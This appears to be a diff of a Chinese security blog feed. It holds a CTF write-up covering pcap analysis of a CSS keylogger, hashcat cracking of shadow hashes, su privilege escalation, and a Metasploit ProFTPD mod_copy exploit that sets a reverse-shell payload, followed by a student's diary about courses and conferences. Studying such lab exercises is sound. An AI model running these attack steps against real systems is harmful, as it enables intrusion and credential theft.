-<h3 id="CSS-Keylogger-150-points-8-solves"><a href="#CSS-Keylogger-150-points-8-solves" class="headerlink" title="CSS-Keylogger (150 points, 8 solves)"></a>CSS-Keylogger (150 points, 8 solves)</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>有趣的CSS Keylogger文章：<br><a href="https://blog.techbridge.cc/2018/03/02/css-key-logger/">CSS keylogger：攻擊與防禦</a><br><a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense">Stealing Data With CSS: Attack and Defense</a></p>
-<p>嘗試在封包中分析此次的CSS Keylogger攻擊與受害者c7f網站上的信箱與密碼，並且嘗試登入</p>
-<blockquote>
-<p>hint: 運氣好或靠實力拿到小遊戲中的flag吧</p>
-</blockquote>
-<p>網站連結 <a href="http://c7f.macacahub.tw/login">http://c7f.macacahub.tw/login</a><br><a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/CSS_Keylogger.pcap">Released file (pcap)</a></p>
-<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>題目給了兩篇關於 CSS Keylogger 的文章，算是課外補充。<br>如果認真對網站進行研究會發現該網站被駭入後，CSS Keylogger 寫在 <code>bootstrap.min.css</code> 內（不知道這個也解的出來啦 XD）。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/01.png" alt=" "></p>
-<p>從網站 source code 可以看得出來登入會驗證信箱格式、以及密碼會加鹽再 Hash，因此不用期待能把封包內撈到的 Hash 拿去爆破密碼 =w=</p>
-<p>從.pcap封包檔的 <code>Follow &gt; TCP Stream</code> 可以觀察到如文章所提的 CSS Keylogger 帶出的參數。</p>
-<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/02.png" alt=" "></p>
-<p>其中前面的 <code>/e/</code> 表示 email、<code>/p/</code> 表示password，也算一種小提示吧。<br>總之整理前面所觀察到的封包特徵，可以用 filter 簡單過濾出來（當然用 TCP Stream 慢慢點也是可以啦 XD）。</p>
-<blockquote>
-<p>http &amp;&amp; ip.dst == 45.79.159.73</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/03.png" alt=" "></p>
-<p>這樣就能拿到三組帳號，再來就是有點運氣的嘗試登入… 沒錯，會這麼說是因為我拿到帳密戳了半小時都沒成功，最後要放棄時就莫名其妙登入了XDDDDDD<br>事後和助教討論也沒得到個明確結果，如果有想法歡迎找我們討論QQ</p>
-<p>登入後… 抓猴子囉!!<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/04.gif" alt=" "></p>
-<p>基本上五隻猴子只有一隻點得到Flag，如果不想慢慢用滑鼠點的話可以縮小視窗把他們關起來，或是直接開 source code 找連結拿 Flag !!</p>
-<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/05.png"></p>
-<h3 id="images-0x2-250-points-1-solve"><a href="#images-0x2-250-points-1-solve" class="headerlink" title="images 0x2 (250 points, 1 solve)"></a>images 0x2 (250 points, 1 solve)</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><p>小朋友才只用工具解題目，大朋友都寫code</p>
-<p><a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/images_0x2.pcap">Released file (pcap)</a></p>
-<h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>這題看起來沒有什麼特殊情境，就是很刻意的希望同學用 coding 解決問題XD<br>基本作法和 <a href="https://blog.eevee.tw/2020/201104-htcf-hw1-writeup/">駭客攻防 hw_0x01 Writeup</a> 差不多，只是要還原的東西不太一樣。</p>
-<p>封包題起手式一樣 <code>Follow &gt; TCP Stream</code>，看到封包內容有 <code>xor_key</code>、<code>image</code> 那就是要把圖片 XOR 還原出來了，方向應該是不難猜，只是在往後看可以發現有多達100個圖片，所以還是乖乖寫扣ㄅ。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/01.png" alt=" "></p>
-<p>順帶一提、<code>xor_key</code> 是用 base64 混淆過，就算 Decode 還原出來也是難以辨識的字串，助教存心不給人手動驗證（雖然圖片好像也很難手工還原就是…）。</p>
-<p>scapy 的教學參考上面連結就不再贅述，不過要注意的是撈 Raw 欄位的資料會有兩種情況（如圖），推測是封包太長被截成兩段QQ ，條件判斷上可以根據封包長度或是判斷資料內容是否有關鍵字。最後，我們關心的重點在 <code>xor_key</code>、<code>image</code> 還有 … 檔名!! 寫完就知道了XD<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/02.png" alt=" "></p>
-<p>由於資料全部都串在一起，處理上有些麻煩… <code>xor_key</code> 和 <code>image</code> 可以用 <code>\r\n</code> 切出來，但 filename 就只能用 <a href="https://regex101.com/">Regular Expression</a> 篩出來，不然就是用指定位址的方式（因為圖片長度其實都相同 XD），剩下看扣應該不難懂：）</p>
-<figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">pkts = rdpcap(<span class="string">&#x27;images_0x2.pcap&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> pkts:</span><br><span class="line">    <span class="keyword">if</span> IP <span class="keyword">in</span> p <span class="keyword">and</span> p[IP].dst == <span class="string">&#x27;140.117.169.219&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> p <span class="keyword">and</span> <span class="string">b&#x27;filename&#x27;</span> <span class="keyword">in</span> p[Raw].load:</span><br><span class="line">            raw = p[Raw].load</span><br><span class="line"></span><br><span class="line">            filename = re.search(<span class="string">b&#x27;filename=&quot;(\w*.\w*)&quot;&#x27;</span>, raw)</span><br><span class="line">            filename = filename.group(<span class="number">1</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            xor_key = base64.b64decode(raw.split(<span class="string">b&#x27;\r\n&#x27;</span>)[<span class="number">3</span>])</span><br><span class="line">            ciphertext = raw.split(<span class="string">b&#x27;\r\n&#x27;</span>)[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 用 mod 的方式重複 padding xor_key</span></span><br><span class="line">            res = [ word ^ xor_key[idx % len(xor_key)] <span class="keyword">for</span> idx, word <span class="keyword">in</span> enumerate(ciphertext) ]</span><br><span class="line"></span><br><span class="line">            img = open(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            img.write(bytes(res))</span><br><span class="line">            img.close()</span><br></pre></td></tr></table></figure>
-
-<p>成功把所有圖片 dump 出來，會發現有分兩種檔名，分別是 0-27 還有 時間戳記，剩下就是慢慢拼 Flag 了!!<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/03.png" alt=" "></p>
-<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="hashmeow-120-points-2-solves"><a href="#hashmeow-120-points-2-solves" class="headerlink" title="hashmeow (120 points, 2 solves)"></a>hashmeow (120 points, 2 solves)</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><p>macacahub.tw 又多開了一個 port 提供 ssh<br>你想要進來拿flag嗎？<br>想要的話可以全部給你… 去找吧！我把所有的帳密都放在檔案裡了</p>
-<blockquote>
-<p>hint 1: 檔案從該提供ssh服務的主機掉出來的<br>hint 2: 10k-most-common.txt 不錯用<br>hint 3: port_number &gt; 1000 &amp;&amp; port_number != 8778 &amp;&amp; port_number != htcf.ports.port_number<br>hint 4: flag在linux某個權限為1777的神奇目錄下<br>hint 5: 運氣也是種實力</p>
-</blockquote>
-<h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>如果有寫過 htcf 的練習題應該知道掃 port 的起手式就是 nmap，掃描查看 Domain 底下開了哪些 port 的服務 (其中 <code>-p-</code> 等同 <code>-p 0-65535</code>)。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p- macacahub.tw</span><br><span class="line">nmap -sV -p 55555 macacahub.tw</span><br></pre></td></tr></table></figure>
-
-<p>根據 hint 3 ，我們可以知道目標 port 是 55555，再進一步利用 <code>-sV</code> 查到是 ssh 服務（hint 1），結果如下。</p>
-<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/01.png" alt=" "></p>
-<p>找到連線入口，接下來我們需要 ssh 連線的帳號密碼。<br>從題目給的 passwd 和 shadow 其實就是存放密碼的檔案，只不過是被 Hash 過的 (可參考 <a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">相關文章</a>），如果想知道更細節內容可以去翻 <a href="http://linux.vbird.org/linux_basic/0410accountmanager.php">鳥哥的私房菜</a>，總之這裡我們需要想辦法把密碼爆破出來!!<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/03.png" alt=" "></p>
-<p>根據 hint 2，可以找到字典檔 <a href="https://github.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt">10k-most-common.txt</a> 並下載至本機端。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/02.png" alt=" "></p>
-<p>再來就是用 <code>hashcat</code> 這個密碼還原工具，題目的 hashmeow 其實就是在暗示這個XDDDD 可參考 hashcat 相關文章，要注意的是 shadow 內的 $6$ 是指 SHA-512，指令要對應到 <code>-m 1800</code>，另外結尾要掛上 <code>--show</code> 不然會沒有結果（笑），針對 shadow 使用 hashcat 可以找到兩組密碼，分別是 root:root 和 shelly:shelly，真的是<strong>弱密碼</strong>欸… 原來是 hint 5 的部分啊。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/04.png" alt=" "></p>
-<p>接著就是要嘗試用 shelly 的帳號登入（平常並不會有人直接用 root 登入，雖然這題預設也鎖 root 登入）。<br>最後就是在裡頭找 Flag 啦，根據 hint 4，可以 Google 發現 1777 權限分數其實指的就是 <code>/tmp</code> 目錄，細節同樣可參考 <a href="http://linux.vbird.org/linux_basic_train/unit05.php">鳥哥私房菜</a>，進到 <code>/tmp</code> 找到 secret 資料夾後輕鬆拿 Flag。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/05.png" alt=" "></p>
-<h3 id="hashmeow-root-50-points-1-solve"><a href="#hashmeow-root-50-points-1-solve" class="headerlink" title="hashmeow root (50 points, 1 solve)"></a>hashmeow root (50 points, 1 solve)</h3><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><p>與hashmeow同題目<br>但是flag在root的家裡</p>
-<h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>承接上題的作法，分數比較低的原因是 Flag 單純放不同資料夾而已 XD<br>回到根目錄<code>/</code>，並且根據提示移動到 root 目錄會發現權限不足，就連 <code>sudo</code> 也不能用QQ 不過有一招基本的提權方式是 <code>sudo su</code>，那我們可以從 <code>bin</code> 目錄找到 <code>su</code> 並且直接執行，被要求輸入的root密碼就是我們剛剛透過 hashcat 爆出來的 root:root，輕鬆提權!!!</p>
-<p>剩下就只是回 <code>/root</code>，拿 Flag !!</p>
-<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/06.png" alt=" "></p>
-<h3 id="ProFTPD-120-points-0-solve"><a href="#ProFTPD-120-points-0-solve" class="headerlink" title="ProFTPD (120 points, 0 solve)"></a>ProFTPD (120 points, 0 solve)</h3><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><p>區網中有一個FTP伺服器，好像有漏洞來著(網路遮罩255.255.255.0，不是 xxx.xxx.xxx.1那台主機)</p>
-<p>請先ssh遠端連線至攻擊用主機(同CTF平台初始的帳號密碼) 接著在攻擊機的區網中找出有漏洞的主機 並且exploit有漏洞的主機 最後取得”/var/www/html/_backup”目錄下的flag檔</p>
-<p>ssh -p 8778 {你的帳號}@macacahub.tw</p>
-<blockquote>
-<p>hint: 建議修改預設LPORT</p>
-</blockquote>
-<h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>登入”攻擊用主機”後，根據題目描述要從區網中找出有漏洞的主機（也提示 FTP Server），先找到目前主機的 IP ，再透過 nmap 掃區網。<br>以本題為例，IP 為 172.30.0.3，則區網掃描可以用 <code>172.30.0.0/24</code> 或是 <code>172.30.0.*</code>，先確認 FTP 主機存在再查看版本細項，暴力一點可以直接用 <code>nmap -A 172.30.0.0/24</code> 一次把細節全部列出來。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/01.png" alt=" "></p>
-<p>可以找到該 FTP Server 的版本為 <code>ProFTPD 1.3.5</code>，可以從 Google 發現有漏洞編號 <strong>CVE-2015-3306</strong>，那就是用上課所學的 Metasploit Framework 嘗試針對這個漏洞進行攻擊。 …沒錯!! 現在登入的這台”攻擊用主機”已經把你把相關工具都裝好了，可以直接下 <code>msfconsole</code> 來找關於漏洞相關的工具，如果懶得從 Google 找漏洞編號，也可以直接在 msf 搜尋 <code>ProFTPD 1.3.5</code> 相關攻擊工具。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/02.png" alt=" "></p>
-<p>剩下就是工具使用，如果有寫課堂作業應該知道基本的操作方式..吧XD<br>參數的設定上 RHOST 目標IP為 nmap 掃出來的 172.30.0.2，SITEPATH 為題目描述的 <code>/var/www/html/</code>（我們其實沒有權限存取 <code>_backup</code>），這題還需要設定 payloads… 而且並不是每一組 payload 都能成功需要一點運氣，不過數量也不多把 payload 全部戳一遍也蠻快der。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/03.png" alt=" "></p>
-<p>設定完 payload 後記得要再確認一次 options，把 LHOST 補上”攻擊用主機”，以便打過去的 reverse shell 才能順利彈回來，若攻擊成功就能拿到 FTP Server 的 shell，剩下就是把 flag 撈出來，結束。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/04.png" alt=" "></p>
-<figure class="highlight shell"><figcaption><span>簡單列一下流程</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ifconfig <span class="comment">#查看當前主機ip: 172.30.0.3</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap 172.30.0.0/24 <span class="comment">#掃區網，找到 FTP 主機(ip 172.30.0.2, port 21)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sV -p 21 172.30.0.2 <span class="comment">#查看剛主機細部資訊，發現是ProFTPD 1.3.5</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> msfconsole</span></span><br><span class="line">msf5 &gt; search ProFTPD 1.3.5</span><br><span class="line">msf5 &gt; use unix/ftp/proftpd_modcopy_exec</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; show options</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set RHOST &lt;target_ip&gt;</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set SITEPATH &lt;target_directory&gt;</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; show payloads</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set payload cmd/unix/reverse_perl</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; show options</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set LHOST &lt;localhost_ip&gt;</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">(reverse shell)</span><br><span class="line">ls </span><br><span class="line">ls _backup</span><br><span class="line">cat _backup/f1aaag.txt</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>HTCF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>實驗室日誌 0x05</title>
     <url>/2021/1f552e985125/</url>
     <content><![CDATA[<p><img src="https://pbs.twimg.com/media/EvtbzcKUcAIsfQn?format=jpg&name=large"> </p>
@@ -1980,161 +2169,10 @@ Pwn大概就是這麼一回事了~
       </tags>
   </entry>
   <entry>
-    <title>碩一生活總結 &amp; Summer Conf. 跑起來</title>
-    <url>/2020/5462b124c8f1/</url>
-    <content><![CDATA[<p><img src="https://photos.smugmug.com/photos/i-THMsDzH/0/bd4879f7/X5/i-THMsDzH-4K.jpg" alt=" "></p>
-<blockquote>
-<p>八月的某天大雨後，回家路上隨手一拍。</p>
-</blockquote>
-<p>隨著時間邁入八月，頭銜也要換成二字頭了，時間真的過好快…<br>希望明年這個時候也能這麼愜意地拍照 😭</p>
-<a id="more"></a>
-
-<p>原本有預計暑假要生一些文章出來，結果暑假行程一不小心排滿了XD<br>再加上原本Lab的例行事務 &amp; 學長姐口試支援，弄到現在好不容易才告個段落<br>…只好拿找論文的時間寫文章（抹臉</p>
-<br>
-
-<h2 id="碩一甘苦談？"><a href="#碩一甘苦談？" class="headerlink" title="碩一甘苦談？"></a>碩一甘苦談？</h2><p>不確定各位的碩一時期是怎麼度過，但我現在回憶起來感覺還蠻愜意的（?）<br>在 <a href="../200413-lab-log-0x03/">實驗室日誌 0x03</a> 這篇其實也提的差不多了w</p>
-<p>咱實驗室的碩一生活重點放在修學分 &amp; 審稿 &amp; 看論文，而我自己還會跑 CTF之類的活動。<br>礙於我們老闆實在太忙了，所以開會的頻率越來越低… 在 <a href="../200413-lab-log-0x03/">實驗室日誌 0x03</a> 才說過有恢復常態，結果因為<font color=orange>好的武漢肺炎</font>疫情關係，以及六月開始各種活動停咪到現在Zzzzz 不曉得到底該不該慶幸 😅</p>
-<p>同時也是因為老闆忙，所以到現在我們還沒修過老闆的課，其中授課教授換人的部分有印度籍老師讓爛英文的我很頭疼QQ 所幸在Lab夥伴們的各種 CARRY 下平安度過，感謝各位嗚嗚。</p>
-<p>若要挑一門最有心得的課，那應該就是<strong>網路安全</strong>吧，資管系老師開的資安碩必修。很妙 XD<br>可想而知大部分都是資管學生居多，老師開學就講明密碼學的部分不會講太深，資安碩的可以不用來聽超酷，雖然我們還是乖乖到教室自修(???) 然後期中考全部申論題，印象中咱Lab只有我的分數炸掉 …果然學店生到哪都是學店生。<br>不過後半學期的 hands-on 和 project 主題都能用網路相關自由發揮蠻有趣的，尤其是還有CTF可以打!!<br>然後我們 <strong>MacacaHub</strong> 一個衝勁除了拿下第一，還差兩題破臺。 <font color=navy>\ 展哥教我 /</font><br>每次上臺報告都被我們當社課塞很多奇怪的梗圖 XD 能這樣玩的課真的不多，推推~</p>
-<p>學分的部分一年下來修了 23 學分… 距離畢業門檻差 5 學分算蠻拚的 😤</p>
-<p>審稿部分聽說不是每個Lab都會有(?) 但個人認為算是不錯的修煉，透過審查(X)找碴(O)他人論文來勉勵自己別犯相同的謬誤，只是偶爾時限太短只能匆匆用 Google translate 啃真的有點可惜。另外有時候是審計畫，而且是頁數hen多的那種，那才真的是直接睡Lab… 沒 我開玩笑ㄉ，通常也不會到很難審，只是會多一件事要忙 XD</p>
-<p>剩下時間<del>除了打機之外</del>就是不停找論文看了，說真的到現在也只有個大方向，議題還沒辦法確定。<br>尤其個人看論文的速度真的頗慢<del>（還會分心寫部落格）</del>，而且必須一段段拿去 Google translate 翻完慢慢啃，曾經試過直接咬原文但成效不彰… 真的是有看沒有懂，最後認命回頭翻成中文，有點擔心會不會因為英文太差無法畢業、嘖。</p>
-<br>
-
-<h2 id="暑假南北趴趴走"><a href="#暑假南北趴趴走" class="headerlink" title="暑假南北趴趴走"></a>暑假南北趴趴走</h2><p>這部分本來想開新的一篇介紹，不過金魚腦如我，很多活動內容已經需要用力回想，更不用說技術細節還沒看完嗚嗚<br>所以就拿來當碩一生活總結的一部分放在這裡當遊記分享 wwwww</p>
-<p>總之，拜疫情所賜，延到暑假的活動真的有夠多，讓我幾乎是以週為單為在台北高雄奔波QwQ<br>同時，這些活動真的都是第一次參加，大學時期真的完全沒有契機讓我這樣一直北上跑活動…</p>
-<h3 id="AIS3-新型態資安食物實務課程-7-27-8-2-NTUST"><a href="#AIS3-新型態資安食物實務課程-7-27-8-2-NTUST" class="headerlink" title="AIS3 新型態資安食物實務課程 (7/27 - 8/2) @NTUST"></a>AIS3 新型態資安<del>食物</del>實務課程 (7/27 - 8/2) @NTUST</h3><p>通過 <a href="../200630-ais3-pre-exam-writeups/">AIS3 Pre-exam</a> 前180名者才能參加的資安課程，印象中最後錄取186名(?) 換句話說就算非資安背景的同學也有一定的實力，課程共七天形式採五天上課、兩天專題報告，而今年的分組類別有 <strong>關鍵基礎設施</strong>、<strong>國家安全</strong>、<strong>數位鑑識</strong>、<strong>網頁安全</strong>、<strong>軟體安全開發</strong>，所以分組的題目會和最後專題議題有關，而且要在上課的五天課餘時間生出來，也因為事前打聽到會弄到半夜，所以我台北人還特地申請台科大宿舍(FREE) = w =</p>
-<p>然後… 可以從官方的安排感受到 <code>關鍵基礎設施</code> &amp; <code>國家安全</code> 投注特別多的心力 XD</p>
-<p>當時在pre-exam的聊天室聽到<strong>關鍵基礎設施</strong>課程會教內網滲透覺得很有趣，所以我填志願放在第一順位，結果課程主要是以工控系統(ICS)為主的資安議題，<a href="https://ithelp.ithome.com.tw/articles/10186904">伊朗核電廠病毒 Stuxnet</a> 和 <a href="https://www.ithome.com.tw/news/125098">2018 台積電產線中毒事件</a> 常常被拿出來鞭(X) 警惕(O)，焦點多圍繞在<code>Modbus 工業領域通訊協定</code>、<code>OPC UA 自動化技術的傳輸協定</code>、<code>SCADA系統</code>，導致要想專題題目時挺頭疼的，畢竟真要做起來規模都不小（或是用模擬的方式），這裡也感謝組員用力 CARRY，臨時生出針對 Operator 和 PLC 之間的明文傳送用 <code>訊息識別碼(MAC)</code> 上簽章防 <code>中間人攻擊(MITM)</code>，也讓我幾乎在旁邊當廢人 QwQ</p>
-<p>其他比較有趣的課像是<strong>數位鑑識</strong>由<strong>陳仲寬</strong>主講的「Chimera APT攻擊調查：案例及調查手法分享」，印象中為了讓我們聽懂前面補很多Domain knowledge，結果最後重點反而講得很匆忙稍嫌可惜，不過內容有趣到<strong>stavhaygn</strong>一度想跳槽到數位鑑識組XD Lab方面教<code>moloch</code>分析<code>.pcap</code>封包，看來以後除了Wireshark又多了一套工具…如果我還記得怎麼用的話。 再來<strong>軟體開發安全</strong>由<strong>Ysc</strong>主講的「開發安全與資安測試」，重點放在<strong>自動化</strong>、<strong>自動化</strong> 還有<strong>自動化</strong>（正色），真的是講師開頭結尾都在強調的東西XDDD 這門重點放在DevOps的<code>CI/CD</code>（即自動化整合及部署），並加入資安各種自動化檢查測試，形成<strong>DevSecOps</strong>讓整個流程能夠更完善，這也讓我發現身邊有很多常用工具有這方面的應用，包括GitHub、GitLab、Docker、Jenkins、Docker，真的算是開了眼界，<del>也可能是我自己太少接觸哭哭</del>。 另外<strong>鄭欣明</strong>帶來的實作4G偽基地站提取手機<code>IMSI</code>也蠻有趣，只是我們自己用手機找不到<code>IMSI</code>沒辦法驗證（只能挖到<code>IMEI</code>）有點好笑，最後做完我還幫官方電腦裝ASCII水族箱 嘻嘻 ヽ(✿ﾟ▽ﾟ)ノ </p>
-<p><img src="https://photos.smugmug.com/photos/i-QfXDMFN/0/17ced5a9/4K/i-QfXDMFN-4K.jpg" alt=" "></p>
-<p>所以我說那個內網滲透呢？嗯、他被放在<strong>網頁安全</strong>由<strong>楊鈞皓</strong>主講的「紅人演練」，是個很精實的AD域滲透實作，包含一些提權及橫向滲透，跟我之前的<strong>網路安全</strong>專題有87%像，只是滲透等級又更高了許多，甚至到有點跟不上的程度 XD  最後<strong>國家安全</strong>唔嗯… 只能說很尷尬，大方向都是都是對網路言論或是資訊進行分析，感覺和這方面有關的台下都… Zzzz 都在念舊上午的紅人演練，看來大家都比較喜歡偏實務演練的課 = w =</p>
-<p><img src="https://photos.smugmug.com/photos/i-wsDKFmt/0/47a2b0fa/L/i-wsDKFmt-L.png" alt=" "></p>
-<p>結果在無聊之餘在報復性聊天室還出現很多CSS攻擊XDDDD<br>最後群組就出現這張圖…. 笑死 <del>CSY明明沒參加還是會被信徒拿出來喊</del></p>
-<p><img src="https://photos.smugmug.com/photos/i-rD8VsbD/0/dcd39928/M/i-rD8VsbD-M.jpg" alt=" "></p>
-<p>噢對 Day 1 &amp; 2 晚上都由額外的活動，所以晚餐是由<strong>奧義智慧</strong>贊助…嗯？你問我他們不是賣冰淇淋的嗎 XD 不僅如此，他們還有出過桌遊呢 🤣</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-VDS44gB/0/a1e4d47c/X5/i-VDS44gB-X5.jpg" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-JD6Qmd6/0/6b83e8fc/X4/i-JD6Qmd6-X4.png" alt=" "></div></div></div></div>
-
-<p>課程共筆的部分可以參考 <a href="https://hackmd.io/@AIS3-2020/AIS3/">https://hackmd.io/@AIS3-2020/AIS3/</a> ，也可以去朝聖一下報復性聊天室，只是現在回去看已經沒那麼精采，當時真的是有些高頻率閃動是看了眼睛會痛 wwwww</p>
-<p>大概就是這樣，最後兩天的專題感覺很微妙。還沒報告的組別忙著報告，報告完的多半也無心繼續聽(?)<br>聽說是從去年改成專題形式，應該大家都比較想玩Final CTF。<br>不過值得一提是<strong>網路安全</strong>組的釣魚實驗，我… 我真的有被騙到wwwww<br>雖然我也是第一個在官方群組反應的，對話還因此被節錄放在他們的報告上（抹臉</p>
-<p>簡言之就是</p>
-<table>
-<thead>
-<tr>
-<th align="center"></th>
-<th align="center">官方網站</th>
-<th align="center">釣魚網站</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Site</td>
-<td align="center">ais3.org</td>
-<td align="center">ais3.tw</td>
-</tr>
-<tr>
-<td align="center">IG</td>
-<td align="center">ais3tw</td>
-<td align="center">ais3org</td>
-</tr>
-</tbody></table>
-<p>他們巧妙的把官方的命名不統一對調，結果就不小心上鉤了 嗚嗚<br>看來我身為資安人的資安意識還差得遠呢 ……</p>
-<h3 id="COSCUP-開源人年會-8-1-8-2-NTUST"><a href="#COSCUP-開源人年會-8-1-8-2-NTUST" class="headerlink" title="COSCUP 開源人年會 (8/1 - 8/2) @NTUST"></a>COSCUP 開源人年會 (8/1 - 8/2) @NTUST</h3><p>有沒有覺得COSCUP的時間有點眼熟 … 嗯沒錯，剛好就是AIS3的最後兩天專題報告<br>而且還同樣都在台科大（大概走路 5 分鐘可到） XD<br>所以當我<strong>關鍵基礎設施</strong>在專題報告 Day 1 上午報完，就開始規劃想聽的議程（下午是<strong>國家安全</strong>專題），然後偷溜出去（抹臉</p>
-<p><img src="https://photos.smugmug.com/photos/i-8FjK6ND/0/380679e1/X5/i-8FjK6ND-X5.jpg" alt=" "></p>
-<p>攤位的部分，因為<strong>stavhaygn</strong>在前幾天在<strong>MOPCON</strong>的粉絲頁tag我開玩笑地想拿貼紙，結果我翹課過去馬上就被官方認出來，還破例讓我多拿幾張，笑死www 到現在還是不太敢貼在筆電上&gt;///&lt;<br><img src="https://photos.smugmug.com/photos/i-2GP5gPg/0/6728e06b/4K/i-2GP5gPg-4K.jpg" alt=" "></p>
-<p>除了到處晃晃拿貼紙，我還在官方攤買了酒杯和線材包，被同行友人笑每次翹課都會有收穫（幹w<br><img src="https://photos.smugmug.com/photos/i-gnBZrJz/0/0b9d8db8/4K/i-gnBZrJz-4K.jpg" alt=" "></p>
-<p>議程部分都大概平均都半小時，Day 1主要都在逛攤、Day 2 由於很想聽<strong>網路安全</strong>的釣魚專題 還有<strong>stavhaygn</strong>的專題，所以偷溜出去的頻率少了一些，印象中聽的議程有<code>GCP</code>、<code>SDN x Cloud</code>、<code>Golang</code>、<code>Vault 私鑰管理</code>，還有個<code>Open Source 推廣分享</code>是去朝聖常常在FB和小馬拌嘴的蝦蝦姊（笑） 。我在開源界的時間不算長，平常也只是偶爾摳來用，所以跑的主題幾乎都是聽過但沒機會摸，算是去增廣見聞，另外、還有認親 XDDDD<br><img src="https://photos.smugmug.com/photos/i-h9WvwDw/0/a20ed182/L/i-h9WvwDw-X5.jpg" alt=" "></p>
